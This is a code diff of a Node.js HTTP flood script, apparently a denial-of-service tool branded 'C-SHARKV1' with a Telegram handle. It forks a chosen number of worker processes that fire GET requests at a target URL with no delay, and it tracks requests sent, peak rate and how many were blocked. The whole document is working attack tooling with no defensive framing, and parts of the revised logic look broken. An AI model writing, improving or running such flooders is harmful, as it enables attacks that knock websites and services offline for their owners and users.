@@ -1,13 +1,11 @@
 const axios = require('axios');
-const http = require('http');
-const https = require('https');
 const { fork } = require('child_process');
 
 // Get command line arguments: target URL and duration
-const [,, targetUrl, timeInSeconds] = process.argv;
+const [,, targetUrl, timeInSeconds, numWorkers] = process.argv;
 
-if (!targetUrl || !timeInSeconds) {
-  console.log('Usage: node attack.js <target_url> <time_in_seconds>');
+if (!targetUrl || !timeInSeconds || !numWorkers) {
+  console.log('Usage: node attack.js <target_url> <time_in_seconds> <num_workers>');
   process.exit(1);
 }
 
@@ -18,95 +16,75 @@ if (isNaN(durationInMs) || durationInMs <= 0) {
   process.exit(1);
 }
 
-// Initialize counters and variables
-let totalSent = 0;
-let successCount = 0;
-let blockedCount = 0;
-let maxRps = 0;
+const totalDuration = durationInMs;
+let totalRequests = 0;
+let successfulRequests = 0;
+let blockedRequests = 0;
+let peakRps = 0;
+let lastRequestsCount = 0;
 let startTime = Date.now();
-let stopTime = startTime + durationInMs;
-let lastSentTime = Date.now();
-let rpsCount = 0;
+let stopTime = startTime + totalDuration;
 
-// Function to send HTTP/1 requests
+const workers = [];
+
+// Function to send HTTP requests
 const sendRequest = async () => {
   try {
-    const agent = targetUrl.startsWith('https') ? new https.Agent({ keepAlive: true }) : new http.Agent({ keepAlive: true });
-    await axios.get(targetUrl, {
-      httpAgent: agent, // Enforce HTTP/1
-      httpsAgent: agent, // Enforce HTTP/1 for https
-    });
-    successCount++;
+    const response = await axios.get(targetUrl);
+    successfulRequests++;
   } catch (error) {
-    if (error.response && error.response.status === 403) {
-      blockedCount++;
-    }
+    blockedRequests++;
   }
 
-  totalSent++;
+  totalRequests++;
 };
 
-// Flood the target continuously
-const performFlood = () => {
+// Function to display live statistics (overwritten every 100ms)
+const displayStats = () => {
+  const currentTime = Date.now();
+  const elapsedTime = currentTime - startTime;
+  const remainingTime = Math.max(stopTime - currentTime, 0);
+  
+  // Calculate the current requests per second (RPS)
+  const rps = totalRequests - lastRequestsCount;
+  peakRps = Math.max(peakRps, rps);
+
+  // Prepare output message
+  const statsMessage = `
+C-SHARKV1 - T.ME/STSVKINGDOM
+
+Total Sent: ${totalRequests}
+Max-RPS: ${peakRps}
+Success: ${successfulRequests}
+Blocked: ${blockedRequests}
+Time Remaining: ${Math.ceil(remainingTime / 1000)}s
+`;
+
+  // Output stats, overwriting the terminal every 100ms
+  process.stdout.write(`\r${statsMessage}`);
+  lastRequestsCount = totalRequests;
+};
+
+// Worker process that performs flooding
+const workerProcess = () => {
   const interval = setInterval(() => {
     if (Date.now() > stopTime) {
-      clearInterval(interval); // Stop after the time limit is reached
-      console.log('\nFlood test completed.');
+      clearInterval(interval);
       return;
     }
 
-    // Send requests as fast as possible
     sendRequest();
-    
-    // Track RPS (Requests Per Second)
-    rpsCount++;
-    if (Date.now() - lastSentTime >= 1000) {
-      maxRps = Math.max(maxRps, rpsCount);
-      rpsCount = 0;
-      lastSentTime = Date.now();
-    }
-  }, 0); // No delay, flood as fast as possible
+    displayStats();
+  }, 0); // No delay, send requests instantly
 };
 
-// Function to log stats with overwriting
-const logStats = () => {
-  const timeRemaining = Math.max(0, stopTime - Date.now());
-  const timeRemainingStr = new Date(timeRemaining).toISOString().substr(14, 5); // Format remaining time (mm:ss)
-
-  const log = `
-C-SHARKV1 - T.ME/STSVKINGDOM
-============================
-total sent: ${totalSent}
-max-r: ${maxRps} rps
-============================
-success: ${successCount}
-Blocked: ${blockedCount}
-============================
-TIME REMAINING: ${timeRemainingStr}
-`;
-
-  process.stdout.write(`\r${log}`);
-};
-
-// Multiplayer Mode - Start 5 concurrent flooders
-const startMultiplayerFlood = () => {
-  for (let i = 0; i < 5; i++) {
-    const flooder = fork(__filename, [targetUrl, timeInSeconds]);
-    flooder.on('message', (msg) => {
-      console.log(msg);
-    });
-    flooder.on('exit', (code) => {
-      console.log(`Flooder ${i + 1} finished with exit code ${code}`);
-    });
-  }
-};
-
-// If we're running this script as a "child" process (after being forked), run the flood
-if (process.argv.length > 2) {
-  performFlood();
-} else {
-  // If we are running as the main script, start the multiplayer mode
-  startMultiplayerFlood();
-  // Log stats every 100ms
-  setInterval(logStats, 100);
+// Launch multiple workers
+for (let i = 0; i < numWorkers; i++) {
+  workers.push(fork(__filename));  // Fork the current script to run as a child process
 }
+
+// Start the attack
+setTimeout(() => {
+  workers.forEach(worker => worker.kill());  // Kill workers after the attack duration
+  console.log("\nFlood test completed.");
+}, totalDuration);
